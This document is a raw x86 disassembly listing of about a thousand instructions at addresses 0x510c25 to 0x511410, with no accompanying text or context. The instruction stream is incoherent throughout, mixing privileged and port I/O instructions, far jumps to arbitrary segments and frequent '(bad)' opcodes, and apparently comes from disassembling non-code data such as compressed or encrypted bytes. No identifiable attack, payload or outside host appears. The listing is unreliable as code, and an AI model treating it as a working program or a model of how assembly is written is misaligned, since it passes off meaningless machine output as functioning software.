  510c25:	add    al,0x9
  510c27:	hlt    
  510c28:	addr16 leave 
  510c2a:	mov    ecx,es
  510c2c:	rcr    BYTE PTR [edi-0x5e8a1787],1
  510c32:	mov    ds:0xe254f654,al
  510c37:	mov    al,0x94
  510c39:	mov    edx,0x58c0726b
  510c3e:	or     al,0x31
  510c40:	cli    
  510c41:	and    esp,esp
  510c43:	pop    ebp
  510c44:	lds    esi,FWORD PTR [ebp-0x7]
  510c47:	add    BYTE PTR [ecx+0x7f],dh
  510c4a:	loopne 0x510c33
  510c4c:	and    eax,0xae0ff3a0
  510c51:	xchg   edi,eax
  510c52:	add    DWORD PTR [ebx+0x1e],edx
  510c55:	fdiv   DWORD PTR [ebx]
  510c57:	push   eax
  510c58:	int    0xaa
  510c5a:	leave  
  510c5b:	lods   al,BYTE PTR ds:[esi]
  510c5c:	mov    ecx,0x3c42cee4
  510c61:	adc    cl,BYTE PTR [ecx+0x30]
  510c64:	mov    dh,cl
  510c66:	retf   
  510c67:	xchg   esi,eax
  510c68:	jle    0x510c3f
  510c6a:	mov    edx,0x34f0c5c2
  510c6f:	pop    edi
  510c70:	inc    ebp
  510c71:	pop    ds
  510c72:	mov    edx,ebp
  510c74:	pop    ecx
  510c75:	es push ebp
  510c77:	push   edi
  510c78:	inc    esp
  510c79:	in     al,0xb4
  510c7b:	pusha  
  510c7c:	mov    eax,ds:0x4caaa8ac
  510c81:	pop    esp
  510c82:	enter  0x5890,0x4e
  510c86:	adc    DWORD PTR [ebp+0x6a8cedf1],esp
  510c8c:	not    DWORD PTR [eax+0x41]
  510c8f:	sbb    DWORD PTR [ebx-0x71589ea4],edx
  510c95:	(bad)  
  510c96:	cmp    cl,BYTE PTR [ebx-0x60]
  510c99:	mov    ecx,0x3c0f8478
  510c9e:	push   0xb
  510ca0:	aam    0x34
  510ca2:	ret    0xf3ea
  510ca5:	ins    BYTE PTR es:[edi],dx
  510ca6:	sbb    eax,DWORD PTR ds:0x196cc32b
  510cac:	jne    0x510c2f
  510cae:	sbb    eax,0xaf378333
  510cb3:	leave  
  510cb4:	sub    eax,0x4f88dabe
  510cb9:	and    BYTE PTR [ecx+0x67f94bce],0x74
  510cc0:	(bad)  
  510cc1:	fcomp  DWORD PTR [eax]
  510cc3:	psubsb mm5,QWORD PTR [edx-0x43]
  510cc7:	out    0x3f,eax
  510cc9:	imul   ecx,edx,0x197ba82e
  510ccf:	test   eax,0x54d996c1
  510cd4:	and    DWORD PTR [ebx+0x79f7f942],ebp
  510cda:	arpl   WORD PTR ds:0x686c2435,cx
  510ce0:	mov    al,ds:0xab5ed19a
  510ce5:	dec    BYTE PTR [eax-0x11bbe2b8]
  510ceb:	mov    BYTE PTR [ecx-0x4fdc0cbe],ch
  510cf1:	and    BYTE PTR [edi+edx*4+0x334b8b0f],dl
  510cf8:	fldenv [ecx+0x14023c40]
  510cfe:	fisubr DWORD PTR [ebp-0x2a]
  510d01:	test   BYTE PTR [ebx+0x3b8adebe],dh
  510d07:	xor    BYTE PTR [ecx-0x59],dl
  510d0a:	or     bl,ch
  510d0c:	test   BYTE PTR [edi+0x7619c903],dh
  510d12:	aam    0x3c
  510d14:	and    al,0xf2
  510d16:	ins    BYTE PTR es:[edi],dx
  510d17:	lea    edi,[ecx+0x15]
  510d1a:	sbb    DWORD PTR [eax],ebx
  510d1c:	loopne 0x510d1b
  510d1e:	dec    edi
  510d1f:	shl    BYTE PTR [edi+0x5],cl
  510d22:	ss push ecx
  510d24:	bound  esi,QWORD PTR [eax]
  510d26:	fild   WORD PTR [eax+0x5c]
  510d29:	fisubr DWORD PTR ds:0x1d12efb8
  510d2f:	and    eax,0xaa5b9781
  510d34:	ds add al,0xea
  510d37:	scas   eax,DWORD PTR es:[edi]
  510d38:	daa    
  510d39:	pushf  
  510d3a:	loop   0x510d01
  510d3c:	or     dh,dh
  510d3e:	jns    0x510d63
  510d40:	ins    DWORD PTR es:[edi],dx
  510d41:	adc    edx,ebx
  510d43:	ins    BYTE PTR es:[edi],dx
  510d44:	mov    ebp,0x6efa94f5
  510d49:	sti    
  510d4a:	mov    eax,0xae25d26d
  510d4f:	cmp    BYTE PTR [esi-0x31630819],dh
  510d55:	mov    ebx,0x114f7a4e
  510d5a:	jge    0x510d63
  510d5c:	std    
  510d5d:	add    ebp,DWORD PTR [edi+esi*4]
  510d60:	ret    
  510d61:	mov    fs,esp
  510d63:	sub    al,0x35
  510d65:	xchg   esp,eax
  510d66:	call   0xf80a:0x3706d95
  510d6d:	inc    esi
  510d6e:	or     ebx,esi
  510d70:	push   0xffffffb2
  510d72:	xchg   ebp,eax
  510d73:	mov    bl,ch
  510d75:	jecxz  0x510d75
  510d77:	xchg   esi,eax
  510d78:	loopne 0x510da7
  510d7a:	gs cmc 
  510d7c:	in     eax,0x74
  510d7e:	or     BYTE PTR [ecx+0x5e],0x86
  510d82:	sahf   
  510d83:	in     eax,0xe6
  510d85:	jge    0x510d5a
  510d87:	jmp    0x35b5:0x81b8b410
  510d8e:	pop    ecx
  510d8f:	fcomip st,st(1)
  510d91:	add    cl,BYTE PTR [ebx-0x59]
  510d94:	(bad)  
  510d95:	sub    eax,0x184a7577
  510d9a:	popf   
  510d9b:	pushf  
  510d9c:	in     al,0x9c
  510d9e:	sbb    BYTE PTR ds:0x1cd7d096,0xd7
  510da5:	rcl    esp,1
  510da7:	inc    esi
  510da8:	int3   
  510da9:	xchg   ecx,eax
  510daa:	cmp    cl,dl
  510dac:	pop    ss
  510dad:	push   cs
  510dae:	sub    edx,DWORD PTR [ebx+0x2bc8d73]
  510db4:	mov    al,0x87
  510db6:	pop    ecx
  510db7:	or     ebp,DWORD PTR [eax]
  510db9:	jmp    0x510d98
  510dbb:	stc    
  510dbc:	test   BYTE PTR [ebx+0x74],al
  510dbf:	in     eax,dx
  510dc0:	cmp    BYTE PTR [eax+0x7a],dh
  510dc3:	dec    ebx
  510dc4:	and    BYTE PTR [eax-0x7c],0x89
  510dc8:	inc    esi
  510dc9:	test   DWORD PTR [ebp-0x21],0x71ad00ec
  510dd0:	jnp    0x510da7
  510dd2:	and    ebx,DWORD PTR [eax+0xee4afb3]
  510dd8:	mov    ebp,0x5adf52c8
  510ddd:	mov    edx,0xff136f91
  510de2:	inc    esi
  510de3:	loopne 0x510e1b
  510de5:	jmp    0xb0be74c1
  510dea:	add    DWORD PTR [ebx],ebx
  510dec:	daa    
  510ded:	dec    ecx
  510dee:	mov    dh,0x5e
  510df0:	in     eax,0x21
  510df2:	outs   dx,DWORD PTR ds:[esi]
  510df3:	jecxz  0x510e47
  510df5:	mov    bl,BYTE PTR [ebp-0x4dc589ab]
  510dfb:	inc    esi
  510dfc:	dec    esi
  510dfd:	inc    esi
  510dfe:	jp     0x510e7a
  510e00:	iret   
  510e01:	ins    DWORD PTR es:[edi],dx
  510e02:	stos   BYTE PTR es:[edi],al
  510e03:	(bad)  
  510e04:	shr    BYTE PTR [esi],cl
  510e06:	icebp  
  510e07:	push   es
  510e08:	int    0xf8
  510e0a:	div    DWORD PTR ds:0xc44c0004
  510e10:	out    0x8e,al
  510e12:	adc    eax,0x6e673219
  510e17:	pop    edi
  510e18:	or     eax,0xf0224db1
  510e1d:	or     DWORD PTR [ebp-0x3f],esp
  510e20:	jmp    0x2746187b
  510e25:	jecxz  0x510e19
  510e27:	mov    al,0x78
  510e29:	cmp    BYTE PTR [edx+esi*1],dl
  510e2c:	push   ecx
  510e2d:	fnstsw WORD PTR [edi]
  510e2f:	adc    edx,DWORD PTR ds:0xb90ac7d5
  510e35:	add    eax,0x9151037d
  510e3a:	inc    ebx
  510e3b:	adc    DWORD PTR [ecx+edx*8+0xb7d8b3f],esp
  510e42:	ror    DWORD PTR [ecx+0x18586833],1
  510e48:	jecxz  0x510e6e
  510e4a:	nop
  510e4b:	sti    
  510e4c:	cmp    DWORD PTR [esi],0x95530542
  510e52:	icebp  
  510e53:	lds    ebp,FWORD PTR [esp+edi*4]
  510e56:	mov    ecx,0x72a40c3e
  510e5b:	pop    ebx
  510e5c:	push   esp
  510e5d:	cmc    
  510e5e:	pop    edx
  510e5f:	jae    0x510e2d
  510e61:	dec    ebp
  510e62:	dec    ecx
  510e63:	fwait
  510e64:	rcl    DWORD PTR [ebx],1
  510e66:	ret    0x6c69
  510e69:	mov    eax,ebp
  510e6b:	popa   
  510e6c:	ret    0xc21f
  510e6f:	nop
  510e70:	inc    edi
  510e71:	(bad)  
  510e72:	cmc    
  510e73:	jae    0x510e79
  510e75:	pusha  
  510e76:	adc    ah,BYTE PTR [edx]
  510e78:	cmp    DWORD PTR [edi+0x77c60d7d],ebx
  510e7e:	jg     0x510e96
  510e80:	or     DWORD PTR [eax+eax*1+0x0],ecx
  510e84:	shl    esp,1
  510e86:	add    dh,BYTE PTR [esi+esi*8]
  510e89:	stc    
  510e8a:	xor    ch,BYTE PTR [edi-0x72]
  510e8d:	and    DWORD PTR [eax-0x7e6c5ac5],edi
  510e93:	dec    eax
  510e94:	retf   
  510e95:	ins    BYTE PTR es:[edi],dx
  510e96:	xlat   BYTE PTR ds:[ebx]
  510e97:	retf   
  510e98:	or     eax,0x37e72f20
  510e9d:	retf   
  510e9e:	sti    
  510e9f:	enter  0x48b1,0xd3
  510ea3:	cmp    al,0x39
  510ea5:	repz add eax,0xccc5056f
  510eab:	mov    al,0xb7
  510ead:	lock out dx,eax
  510eaf:	rcr    dl,1
  510eb1:	jno    0x510e8b
  510eb3:	dec    DWORD PTR [ebp+0x58]
  510eb6:	xchg   ebp,eax
  510eb7:	pop    esp
  510eb8:	jp     0x510ed9
  510eba:	add    edx,eax
  510ebc:	lds    ebx,FWORD PTR [ebx-0x174794e8]
  510ec2:	fisub  WORD PTR [eax]
  510ec4:	pop    ebp
  510ec5:	mov    ebx,0x645f4c43
  510eca:	sbb    eax,0x154d83cf
  510ecf:	and    BYTE PTR [edi-0x708a1bed],0xef
  510ed6:	jl     0x510ee9
  510ed8:	jbe    0x510ece
  510eda:	jmp    0xd730:0xf2288f1
  510ee1:	ret    0xb661
  510ee4:	pop    esi
  510ee5:	sbb    DWORD PTR [esi],ecx
  510ee7:	out    0x35,eax
  510ee9:	inc    ecx
  510eea:	div    ecx
  510eec:	lahf   
  510eed:	outs   dx,DWORD PTR ds:[esi]
  510eee:	bound  esp,QWORD PTR [edx-0x2b]
  510ef1:	jbe    0x510ebb
  510ef3:	stc    
  510ef4:	jge    0x510f32
  510ef6:	jne    0x510e84
  510ef8:	mov    dh,0xac
  510efa:	mov    eax,0xbdec6fb1
  510eff:	iret   
  510f00:	xchg   edi,eax
  510f01:	sbb    BYTE PTR [eax],ah
  510f03:	jno    0x510f5d
  510f05:	lock pop ds
  510f07:	inc    esp
  510f08:	pop    eax
  510f09:	pop    edi
  510f0a:	div    DWORD PTR [edi-0x37674cb]
  510f10:	dec    esp
  510f11:	sub    DWORD PTR [esi],edx
  510f13:	mov    ch,0x6c
  510f15:	mov    BYTE PTR [edi+0x7d5a3c55],ch
  510f1b:	inc    ebp
  510f1c:	adc    edi,ecx
  510f1e:	xor    DWORD PTR [ecx+0x14],esi
  510f21:	jecxz  0x510eb6
  510f23:	or     BYTE PTR [ecx-0x6b1b23a8],cl
  510f29:	mov    al,0x38
  510f2b:	pop    esi
  510f2c:	mov    ds:0x43ae4de7,eax
  510f31:	pop    esp
  510f32:	lods   eax,DWORD PTR ds:[esi]
  510f33:	ret    0xbe12
  510f36:	xor    ah,BYTE PTR [ecx+0x50fb2ffc]
  510f3c:	outs   dx,DWORD PTR ds:[esi]
  510f3d:	pop    ecx
  510f3e:	es loop 0x510ef2
  510f41:	push   ds
  510f42:	ins    BYTE PTR es:[edi],dx
  510f43:	pusha  
  510f44:	dec    eax
  510f45:	(bad)  
  510f46:	jne    0x510f01
  510f48:	test   al,0x16
  510f4a:	and    DWORD PTR [edi+0x4],ebx
  510f4d:	(bad)  
  510f4e:	or     eax,0xaf7c96c2
  510f53:	retf   0xc217
  510f56:	in     eax,dx
  510f57:	stc    
  510f58:	push   0x20172f80
  510f5d:	fs inc edx
  510f5f:	mov    BYTE PTR [ebx-0x7b],ch
  510f62:	jle    0x510f9f
  510f64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  510f65:	mov    eax,0xe4ac9d5a
  510f6a:	mov    edx,ebp
  510f6c:	adc    BYTE PTR es:[esi-0x12],cl
  510f70:	adc    DWORD PTR [esi],0xd7f63a66
  510f76:	mov    edi,0x88beda93
  510f7b:	lods   eax,DWORD PTR ds:[esi]
  510f7c:	mov    al,ss:0x60994e7d
  510f82:	push   ebx
  510f83:	jmp    0x8da8:0xd6a2072c
  510f8a:	add    eax,0x992a7ff6
  510f8f:	xor    DWORD PTR [ebx],0xdc2b3c13
  510f95:	(bad)  
  510f96:	stc    
  510f97:	test   al,0x22
  510f99:	test   DWORD PTR [edx-0x4415b670],ecx
  510f9f:	loopne 0x510f45
  510fa1:	pop    ss
  510fa2:	lahf   
  510fa3:	mov    ?,WORD PTR [edx+0x577e5578]
  510fa9:	mov    ebp,0x94a81f7c
  510fae:	test   DWORD PTR [edx+0x4630d564],edx
  510fb4:	ss ss pop esp
  510fb7:	add    al,0xbe
  510fb9:	and    bh,dh
  510fbb:	ins    BYTE PTR es:[edi],dx
  510fbc:	ins    DWORD PTR es:[edi],dx
  510fbd:	sub    DWORD PTR [esp+edi*1+0x37],0x92147f5e
  510fc5:	add    esi,esi
  510fc7:	add    esi,edx
  510fc9:	(bad)  
  510fca:	call   0xbeac53e5
  510fcf:	ror    DWORD PTR [ecx],0x31
  510fd2:	(bad)  
  510fd3:	aam    0x83
  510fd5:	push   esp
  510fd6:	in     al,0x86
  510fd8:	mov    edi,ebx
  510fda:	call   0x956d0f2d
  510fdf:	add    ebp,edi
  510fe1:	sub    dl,BYTE PTR [esi-0x62069e6a]
  510fe7:	call   0x3f65:0xe53c1715
  510fee:	push   ebp
  510fef:	xchg   BYTE PTR [esi-0xd],bl
  510ff2:	lahf   
  510ff3:	inc    esp
  510ff4:	fcmovne st,st(1)
  510ff6:	sbb    eax,DWORD PTR [eax+0x79]
  510ff9:	mov    bh,0xe0
  510ffb:	adc    al,0x2f
  510ffd:	out    dx,eax
  510ffe:	test   al,0xd8
  511000:	jg     0x511022
  511002:	fs ja  0x511004
  511005:	retf   
  511006:	call   0x94651427
  51100b:	xlat   BYTE PTR ds:[ebx]
  51100c:	mov    al,0xd1
  51100e:	pusha  
  51100f:	(bad)  
  511010:	xchg   edi,eax
  511011:	aaa    
  511012:	xor    al,0x13
  511014:	and    esi,DWORD PTR [edx-0x25084020]
  51101a:	sub    bh,bl
  51101c:	and    DWORD PTR [ecx],edx
  51101e:	mov    DWORD PTR ds:0x4e26a34f,edx
  511024:	repz jge 0x51104b
  511027:	call   0x2816472
  51102c:	mov    ecx,0x12fd958
  511031:	ds loopne 0x511050
  511034:	dec    eax
  511035:	mov    edi,0x17abbd9e
  51103a:	xor    ch,cl
  51103c:	cli    
  51103d:	test   al,0x66
  51103f:	sbb    dl,bl
  511041:	sub    eax,0xb8d41966
  511046:	shl    BYTE PTR [ebp-0x29cd8975],1
  51104c:	push   ecx
  51104d:	idiv   BYTE PTR [ebx+edi*1+0x4ae6d6c7]
  511054:	adc    bl,al
  511056:	outs   dx,BYTE PTR ds:[esi]
  511057:	xchg   ebx,eax
  511058:	jg     0x51104f
  51105a:	jae    0x511082
  51105c:	adc    eax,0x53fa1295
  511061:	cwde   
  511062:	int    0xdd
  511064:	ds jle 0x511050
  511067:	iret   
  511068:	into   
  511069:	push   ebx
  51106a:	jne    0x511030
  51106c:	or     eax,0x6875e170
  511071:	mov    cl,0xb1
  511073:	das    
  511074:	daa    
  511075:	lock cmp cl,dl
  511078:	pushf  
  511079:	repnz es push ds
  51107c:	push   esp
  51107d:	mov    ecx,0xbdba483e
  511082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  511083:	mov    ah,0x40
  511085:	mov    cl,0x72
  511087:	jmp    0x51109e
  511089:	inc    ebp
  51108a:	out    0xd4,eax
  51108c:	inc    ebx
  51108d:	pop    ss
  51108e:	add    edx,ebp
  511090:	aam    0xef
  511092:	stos   DWORD PTR es:[edi],eax
  511093:	stos   DWORD PTR es:[edi],eax
  511094:	je     0x511040
  511096:	addr16 xchg edx,eax
  511098:	les    ecx,FWORD PTR [ebx]
  51109a:	xchg   esp,eax
  51109b:	pop    ss
  51109c:	iret   
  51109d:	rcl    BYTE PTR ds:0xb189ec63,1
  5110a3:	jb     0x51107e
  5110a5:	jbe    0x511093
  5110a7:	addr16 or eax,0x858fb615
  5110ad:	lock or eax,0x5e59a225
  5110b3:	sub    al,0xdc
  5110b5:	xlat   BYTE PTR ds:[ebx]
  5110b6:	(bad)
  5110b9:	les    ecx,FWORD PTR [edi+0x47073b42]
  5110bf:	xchg   ecx,eax
  5110c0:	dec    ebp
  5110c1:	sbb    ch,al
  5110c3:	lahf   
  5110c4:	dec    ecx
  5110c5:	ret    
  5110c6:	ins    DWORD PTR es:[edi],dx
  5110c7:	lea    edi,[ebp+0x172a0abc]
  5110cd:	ss nop
  5110cf:	xchg   ecx,eax
  5110d0:	shr    DWORD PTR [eax-0x14],0xf8
  5110d4:	jo     0x51110c
  5110d6:	sub    BYTE PTR [ecx-0x6d],bh
  5110d9:	inc    ecx
  5110da:	ja     0x51111d
  5110dc:	push   edi
  5110dd:	lods   eax,DWORD PTR ds:[esi]
  5110de:	icebp  
  5110df:	mov    esi,0x564b327c
  5110e4:	pop    edx
  5110e5:	rcr    DWORD PTR [ebx-0x603ce9e7],cl
  5110eb:	fisubr DWORD PTR [edx+0x2564bc4c]
  5110f1:	mov    WORD PTR [edx],fs
  5110f3:	aam    0xbf
  5110f5:	and    edi,esi
  5110f7:	or     DWORD PTR [ebx+0x5d],ebp
  5110fa:	dec    esp
  5110fb:	mov    edi,0x1e880f57
  511100:	pop    edi
  511101:	push   edx
  511102:	dec    ebx
  511103:	sti    
  511104:	imul   DWORD PTR [ebx-0x5b]
  511107:	push   esi
  511108:	mov    ebx,edi
  51110a:	popf   
  51110b:	cs or  esi,0xffffffbd
  51110f:	test   eax,0xc7878c88
  511114:	mov    edi,0x9ec690ea
  511119:	fwait
  51111a:	leave  
  51111b:	fcomp  DWORD PTR [ecx]
  51111d:	cli    
  51111e:	xchg   esi,eax
  51111f:	xchg   ebx,eax
  511120:	sbb    eax,0xf752d8d1
  511125:	mov    bl,0x47
  511127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  511128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  511129:	jg     0x5110fa
  51112b:	jmp    0x5110e7
  51112d:	(bad)  
  51112e:	pop    esi
  51112f:	enter  0xf2bc,0x6a
  511133:	fmul   QWORD PTR [ecx+0x66055c7e]
  511139:	mov    al,0xb5
  51113b:	jmp    0xfc56e636
  511140:	and    bh,cl
  511142:	sub    eax,0x15bfaeca
  511147:	retf   0xd188
  51114a:	add    BYTE PTR [ebx],0x31
  51114d:	pop    es
  51114e:	or     bl,bl
  511150:	add    eax,0x4be7f234
  511155:	ss dec edi
  511157:	int3   
  511158:	push   esi
  511159:	sbb    eax,0xdc7eca15
  51115e:	inc    edi
  51115f:	pop    es
  511160:	xchg   esi,eax
  511161:	inc    ebp
  511162:	add    bl,ah
  511164:	sub    DWORD PTR [ebx],0x32
  511167:	test   al,0x8f
  511169:	popa   
  51116a:	ficom  DWORD PTR [eax]
  51116c:	sbb    eax,0xa9a90956
  511171:	jbe    0x5110f6
  511173:	js     0x51116a
  511175:	mov    cl,ch
  511177:	and    al,0x97
  511179:	call   FWORD PTR [ecx+0x52]
  51117c:	(bad)  
  51117d:	or     ch,ah
  51117f:	adc    ebx,DWORD PTR [edi-0x4eb59055]
  511185:	mov    ah,BYTE PTR [bp+di-0x1f]
  511189:	sub    eax,0xf0f775a0
  51118e:	mov    ah,0x33
  511190:	and    ah,ch
  511192:	xor    al,BYTE PTR [ecx-0x1e14a875]
  511198:	ins    DWORD PTR es:[edi],dx
  511199:	loop   0x51111e
  51119b:	xor    BYTE PTR [ebx+0x1f],cl
  51119e:	(bad)  
  51119f:	cmp    DWORD PTR [edi],edi
  5111a1:	inc    ebp
  5111a2:	(bad)  
  5111a3:	jmp    0x1551:0x91a82323
  5111aa:	(bad)
  5111ad:	sbb    ch,ch
  5111af:	jo     0x5111a9
  5111b1:	jge    0x511168
  5111b3:	push   0xf1996357
  5111b8:	loopne 0x5111e2
  5111ba:	mov    bh,0x24
  5111bc:	lds    ecx,FWORD PTR [ebp+0x2e]
  5111bf:	mov    es,WORD PTR [eax-0x1d]
  5111c2:	inc    bh
  5111c4:	xor    ecx,DWORD PTR [edx-0x13]
  5111c7:	jno    0x5111d5
  5111c9:	push   0x5a
  5111cb:	mov    ecx,0x3c4ef84
  5111d0:	fiadd  WORD PTR [eax-0x6a977a16]
  5111d6:	les    esi,FWORD PTR [eax+0x735dae6c]
  5111dc:	cmp    edi,DWORD PTR [ebx-0x2fe13215]
  5111e2:	cmc    
  5111e3:	push   ebx
  5111e4:	ja     0x511176
  5111e6:	retf   0xb315
  5111e9:	and    ebp,DWORD PTR [edx]
  5111eb:	sub    BYTE PTR [ebp+0x51ce2aea],dl
  5111f1:	xchg   ebp,eax
  5111f2:	inc    ebp
  5111f3:	mov    al,ds:0x536152df
  5111f8:	pop    ecx
  5111f9:	sbb    DWORD PTR [esi+0x6886f645],ebx
  5111ff:	lods   eax,DWORD PTR ds:[esi]
  511200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  511201:	mov    ds:0xf0d3fa85,al
  511206:	sub    BYTE PTR [esi-0x2a],dl
  511209:	jnp    0x51124a
  51120b:	add    dh,BYTE PTR [esi]
  51120d:	imul   ebx,DWORD PTR [edx+ecx*8-0x10],0xffffffe4
  511212:	dec    eax
  511213:	mov    ebx,0xfa3d6ba5
  511218:	xlat   BYTE PTR ds:[ebx]
  511219:	imul   esp,DWORD PTR [esi+ecx*4-0x59],0xa4edfb98
  511221:	sbb    al,0x41
  511223:	or     al,0x80
  511225:	lock mov edx,DWORD PTR [esi+ebx*8]
  511229:	inc    esi
  51122a:	(bad)  
  51122b:	aad    0x62
  51122d:	retf   0x9461
  511230:	not    edx
  511232:	or     BYTE PTR [esi+0x4ac1840c],ch
  511238:	xlat   BYTE PTR ds:[ebx]
  511239:	test   eax,0x95189800
  51123e:	xchg   esi,eax
  51123f:	xor    DWORD PTR [ecx],ebx
  511241:	sar    BYTE PTR [edi],1
  511243:	imul   ebp,DWORD PTR [edi],0x36
  511246:	or     cl,ch
  511248:	jecxz  0x5111ef
  51124a:	aas    
  51124b:	fist   DWORD PTR [ebx+0x4f]
  51124e:	paddw  mm0,QWORD PTR [edi+edx*2]
  511252:	cdq    
  511253:	cwde   
  511254:	(bad)  
  511256:	fcomi  st,st(7)
  511258:	lds    esp,FWORD PTR [ebx+0x54684650]
  51125e:	xchg   BYTE PTR [edx+0x40],cl
  511261:	enter  0xf6bf,0xf7
  511265:	outs   dx,DWORD PTR ds:[esi]
  511266:	int3   
  511267:	(bad)  
  511268:	call   0xc766:0xb77b63aa
  51126f:	jae    0x511283
  511271:	psubsw mm3,QWORD PTR [eax+0x4763a9ae]
  511278:	jne    0x51125e
  51127a:	dec    ecx
  51127b:	into   
  51127c:	adc    eax,0x3f0a01dc
  511281:	and    ah,bl
  511283:	fisttp DWORD PTR [edx]
  511285:	jnp    0x5112b8
  511287:	jnp    0x511278
  511289:	mov    al,0x97
  51128b:	xor    BYTE PTR [ebx+0x7b],dl
  51128e:	rcr    BYTE PTR [ebx-0x3a2f50b6],0xcc
  511295:	jmp    0x54e1:0x824accd7
  51129c:	ss retf 0x569e
  5112a0:	cdq    
  5112a1:	mov    cl,0xe9
  5112a3:	and    BYTE PTR [ebx],cl
  5112a5:	mov    esp,0xbf2fc388
  5112aa:	dec    eax
  5112ab:	dec    esp
  5112ac:	mov    esp,0xaeb4a3ae
  5112b1:	xor    esp,DWORD PTR [edx+0x7b]
  5112b4:	std    
  5112b5:	push   esp
  5112b6:	fnsave [esp+esi*4-0x57]
  5112ba:	ja     0x511313
  5112bc:	addr16 add eax,0x53ba313d
  5112c2:	nop
  5112c3:	scas   eax,DWORD PTR es:[edi]
  5112c4:	jo     0x5112a2
  5112c6:	lods   eax,DWORD PTR ds:[esi]
  5112c7:	pusha  
  5112c8:	and    DWORD PTR [eax+eax*1-0x3],edx
  5112cc:	jo     0x511340
  5112ce:	cwde   
  5112cf:	push   ebp
  5112d0:	xor    eax,0xeafc3cab
  5112d5:	jg     0x51127f
  5112d7:	or     eax,0xbbed4d81
  5112dc:	in     eax,0xef
  5112de:	test   DWORD PTR [ecx+0x54],0x9821be6c
  5112e5:	dec    ecx
  5112e6:	push   cs
  5112e7:	scas   eax,DWORD PTR es:[edi]
  5112e8:	rcr    DWORD PTR [eax+ebp*2-0x428c1ad2],0xfe
  5112f0:	pop    ss
  5112f1:	mov    BYTE PTR cs:[eax],al
  5112f4:	imul   ecx,DWORD PTR [edx+0x31],0x3c
  5112f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5112f9:	mov    edx,DWORD PTR [ecx]
  5112fb:	mov    ebx,0x1f0442aa
  511300:	cdq    
  511301:	pusha  
  511302:	stos   BYTE PTR es:[edi],al
  511303:	ss je  0x5112ff
  511306:	je     0x511319
  511308:	xchg   esp,eax
  511309:	ror    BYTE PTR [ebx],cl
  51130b:	dec    edx
  51130c:	ss (bad) 
  51130e:	in     al,0x49
  511310:	popa   
  511311:	scas   al,BYTE PTR es:[edi]
  511312:	mov    ecx,0xc942ae0a
  511317:	xchg   esp,eax
  511318:	out    0xea,al
  51131a:	adc    bh,BYTE PTR [esi-0x42]
  51131d:	mov    edi,0x81479ee0
  511322:	dec    ebx
  511323:	xor    edx,DWORD PTR [ebp+0x25]
  511326:	stc    
  511327:	jne    0x5112d3
  511329:	push   ss
  51132a:	inc    ecx
  51132b:	push   ecx
  51132c:	inc    edi
  51132d:	jb     0x51133e
  51132f:	sub    ecx,0x2e
  511332:	(bad)  
  511333:	fcom   DWORD PTR [esi]
  511335:	ds inc eax
  511337:	sar    BYTE PTR [eax-0x65],0x8e
  51133b:	sbb    ebx,DWORD PTR [eax-0x8]
  51133e:	jbe    0x5112df
  511340:	retf   0x5d62
  511343:	mov    cs,WORD PTR [ebp-0x56e3a3ac]
  511349:	pop    edi
  51134a:	inc    edx
  51134b:	push   ss
  51134c:	sub    bh,BYTE PTR [ebx-0x304f4d8d]
  511352:	iret   
  511353:	cld    
  511354:	xor    al,0x33
  511356:	ss mov bl,0xd9
  511359:	mov    eax,0x56e98fbb
  51135e:	lahf   
  51135f:	lock repnz sbb ebp,edi
  511363:	aam    0xb3
  511365:	jno    0x511351
  511367:	sub    al,0x2b
  511369:	ret    0x642f
  51136c:	xchg   ebp,eax
  51136d:	jb     0x51132b
  51136f:	cmp    dl,BYTE PTR [ecx+0x1f41a598]
  511375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  511376:	or     BYTE PTR es:[esi],bh
  511379:	fsubr  QWORD PTR [edx-0x4c8ebd0b]
  51137f:	stos   DWORD PTR es:[edi],eax
  511380:	adc    DWORD PTR [eax+ebp*2],edi
  511383:	dec    edi
  511384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  511385:	cdq    
  511386:	inc    ebp
  511387:	iret   
  511388:	repz push esp
  51138a:	mov    cl,0x38
  51138c:	scas   al,BYTE PTR es:[edi]
  51138d:	mov    bl,0xb3
  51138f:	cmp    BYTE PTR [edi],al
  511391:	rol    DWORD PTR [esi],cl
  511393:	popf   
  511394:	and    al,0xa4
  511396:	add    BYTE PTR [ebx],al
  511398:	jo     0x511395
  51139a:	add    DWORD PTR [esi],esp
  51139c:	pop    eax
  51139d:	js     0x51138d
  51139f:	adc    ah,BYTE PTR [edx-0x23ae9823]
  5113a5:	hlt    
  5113a6:	xor    esp,edx
  5113a8:	cs adc dl,dl
  5113ab:	mov    BYTE PTR [ecx+0x5],0xd8
  5113af:	xor    esp,edx
  5113b1:	test   dh,ah
  5113b3:	nop
  5113b4:	scas   al,BYTE PTR es:[edi]
  5113b5:	stos   DWORD PTR es:[edi],eax
  5113b6:	xor    BYTE PTR ds:0xb3d311d6,ah
  5113bc:	fstp   TBYTE PTR [ecx]
  5113be:	mov    ecx,DWORD PTR [edi]
  5113c0:	sub    eax,edi
  5113c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5113c3:	dec    edi
  5113c4:	call   FWORD PTR [ebp-0x71]
  5113c7:	mov    edx,0xcfcc325a
  5113cc:	inc    esp
  5113cd:	dec    ecx
  5113ce:	ror    BYTE PTR [ecx+0x6e],0x1e
  5113d2:	fldenv [esi-0x7c]
  5113d5:	mov    al,0xb8
  5113d7:	arpl   WORD PTR [ecx+eiz*4-0xe94d9be],di
  5113de:	repz mov ebx,0x6f273e39
  5113e4:	fld    TBYTE PTR ds:0x24d316f9
  5113ea:	hlt    
  5113eb:	inc    edi
  5113ec:	dec    eax
  5113ed:	pop    ebp
  5113ee:	jmp    0x44e6:0x8851df52
  5113f5:	lods   al,BYTE PTR ds:[esi]
  5113f6:	std    
  5113f7:	cld    
  5113f8:	jmp    0x607c:0x5c215eed
  5113ff:	xlat   BYTE PTR ds:[ebx]
  511400:	outs   dx,DWORD PTR ds:[esi]
  511401:	sti    
  511402:	leave  
  511403:	icebp  
  511404:	push   0xffffff86
  511406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  511407:	add    eax,0xa749e837
  51140c:	fdiv   QWORD PTR [ebp-0x4f]
  51140f:	sti    
  511410:	xchg   esp,eax
